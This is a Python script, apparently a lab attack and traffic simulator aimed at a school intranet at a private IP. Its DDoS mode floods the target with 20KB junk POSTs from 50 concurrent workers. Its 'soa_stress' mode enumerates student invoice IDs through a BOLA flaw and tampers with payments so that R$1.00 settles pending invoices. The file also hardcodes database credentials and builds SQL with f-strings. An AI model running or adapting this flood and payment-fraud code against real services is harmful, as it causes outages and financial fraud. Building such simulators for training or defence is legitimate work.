import asyncio
import os
import random
import time
import datetime
import aiohttp
import aiomysql

# Configurações do Banco de Dados Alvo (necessário para pegar usuários reais)
DB_HOST = os.getenv('DB_HOST', '10.10.100.4')
DB_PORT = int(os.getenv('DB_PORT', '3306'))
DB_USER = os.getenv('DB_USER', 'intranet_user')
DB_PASS = os.getenv('DB_PASS', 'bcd127')
DB_NAME = os.getenv('DB_NAME', 'intranet_db')

async def get_random_user(pool, role):
    try:
        async with pool.acquire() as conn:
            async with conn.cursor(aiomysql.DictCursor) as cursor:
                if role == 'student':
                    await cursor.execute("SELECT registration as username, 'sim' as password FROM students WHERE name LIKE '[SIM]%' AND password IS NOT NULL ORDER BY RAND() LIMIT 1")
                else:
                    await cursor.execute("SELECT username, 'sim' as password, id FROM professors WHERE name LIKE '[SIM]%' AND password IS NOT NULL ORDER BY RAND() LIMIT 1")
                
                user = await cursor.fetchone()
                
                if not user:
                    if role == 'student':
                        await cursor.execute("SELECT registration as username, 'senha123' as password FROM students WHERE password IS NOT NULL LIMIT 1")
                    else:
                        await cursor.execute("SELECT username, 'senha123' as password, id FROM professors WHERE password IS NOT NULL LIMIT 1")
                    user = await cursor.fetchone()
                
                return user
    except Exception as e:
        print(f"Erro DB get_random_user: {e}")
        return None

async def worker_ddos(worker_id, target_url):
    print(f"[DDoS {worker_id}] Iniciado para {target_url}")
    payload = b"X" * 20480 # 20KB de lixo
    timeout = aiohttp.ClientTimeout(total=2)
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        while True:
            try:
                await session.post(target_url, data=payload)
            except Exception:
                pass
            await asyncio.sleep(0.01)

async def worker_human(worker_id, target_url, bot_type, pool):
    print(f"[Human {worker_id}] Iniciado. Tipo: {bot_type}")
    
    timeout = aiohttp.ClientTimeout(total=10)
    conn = aiohttp.TCPConnector(ssl=False)
    
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        while True:
            try:
                session.headers.update({'User-Agent': f'Bot-Agent-{random.randint(1000,9999)}'})
                
                user = await get_random_user(pool, bot_type)
                if not user:
                    await asyncio.sleep(2)
                    continue

                login_data = {
                    "username": user['username'],
                    "password": user['password'],
                    "login_type": bot_type
                }
                
                # Faz o login (Isso gasta muita CPU por causa do Bcrypt, então faremos poucas vezes)
                async with session.post(f"{target_url}/login", data=login_data, allow_redirects=False) as res:
                    if res.status in [302, 303]:
                        # Loop de comportamento interno: Fica logado gerando carga pesada de Banco de Dados sem travar o Bcrypt
                        for _ in range(50):
                            if bot_type == 'student':
                                async with session.get(f"{target_url}/student_dashboard") as dash_res:
                                    pass
                                await asyncio.sleep(0.2)
                            
                            elif bot_type == 'professor':
                                async with pool.acquire() as db_conn:
                                    async with db_conn.cursor(aiomysql.DictCursor) as cursor:
                                        await cursor.execute(f"SELECT id FROM classes WHERE professor_id = {user['id']} ORDER BY RAND() LIMIT 1")
                                        cls = await cursor.fetchone()
                                        
                                        if cls:
                                            class_id = cls['id']
                                            await cursor.execute(f"SELECT student_id FROM student_class WHERE class_id = {class_id} ORDER BY RAND() LIMIT 3")
                                            students = await cursor.fetchall()
                                            
                                            for st in students:
                                                grade_data = {"student_id": st['student_id'], "value": str(random.randint(5,10)), "description": "Prova"}
                                                async with session.post(f"{target_url}/prof_dashboard/class/{class_id}/grade", data=grade_data):
                                                    pass
                                                
                                            today = datetime.datetime.now().strftime("%Y-%m-%d")
                                            att_data = {'date': today, 'absent_students': [str(st['student_id']) for st in students]}
                                            async with session.post(f"{target_url}/prof_dashboard/class/{class_id}/attendance", data=att_data):
                                                pass
                            
                            # Pequena pausa entre cada clique dentro do sistema
                            await asyncio.sleep(random.uniform(0.1, 0.5))
                        
                        # Logout após 50 ações
                        async with session.get(f"{target_url}/logout"):
                            pass
                        
            except Exception as e:
                pass
            
            # Pausa longa antes de fazer login de novo com outro usuário
            await asyncio.sleep(random.uniform(2.0, 5.0))

async def worker_soa(worker_id, target_url):
    print(f"[SOA Stress {worker_id}] Iniciado para {target_url}")
    timeout = aiohttp.ClientTimeout(total=5)
    conn = aiohttp.TCPConnector(ssl=False)
    
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        while True:
            try:
                # Gera IDs aleatórios para simular a vulnerabilidade BOLA
                random_student_id = random.randint(1, 1500)
                
                # Requisita as faturas (Isso também força a API a fabricar novas faturas no SQLite se não existirem)
                async with session.get(f"{target_url}/api/billing/invoices/{random_student_id}") as res:
                    if res.status == 200:
                        invoices = await res.json()
                        
                        # Se encontrou faturas pendentes, simula o Parameter Tampering
                        for inv in invoices:
                            if inv.get('status') == 'PENDING':
                                # Tentativa de fraude: pagar apenas R$ 1.00
                                payment_payload = {
                                    "invoice_id": inv['id'],
                                    "amount": 1.00
                                }
                                async with session.post(f"{target_url}/api/billing/pay", json=payment_payload) as pay_res:
                                    pass
                                break # Paga apenas uma e segue em frente
                                
            except Exception:
                pass
            
            # Pausa curta para floodar o SOA sem travar o atacante
            await asyncio.sleep(random.uniform(0.1, 0.5))

async def main():
    target_url = os.getenv('TARGET_URL', 'https://10.10.100.4').rstrip('/')
    bot_type = os.getenv('BOT_TYPE', 'student') 

    print(f"[*] Gerenciador de Bot Iniciado. Tipo: {bot_type} | Alvo: {target_url}")

    if bot_type == 'ddos':
        tasks = [asyncio.create_task(worker_ddos(i, target_url)) for i in range(50)]
        await asyncio.gather(*tasks)
    elif bot_type == 'soa_stress':
        tasks = [asyncio.create_task(worker_soa(i, target_url)) for i in range(30)]
        await asyncio.gather(*tasks)
    else:
        while True:
            try:
                pool = await aiomysql.create_pool(
                    host=DB_HOST, port=DB_PORT, user=DB_USER, password=DB_PASS, db=DB_NAME,
                    minsize=1, maxsize=20, autocommit=True, connect_timeout=10
                )
                print("[*] Conexão com o banco de dados estabelecida. Iniciando workers humanos...")
                tasks = [asyncio.create_task(worker_human(i, target_url, bot_type, pool)) for i in range(10)]
                await asyncio.gather(*tasks)
                break
            except Exception as e:
                print(f"[!] Erro ao conectar no pool DB ({DB_HOST}:{DB_PORT}): {str(e)}")
                await asyncio.sleep(5)

if __name__ == '__main__':
    asyncio.run(main())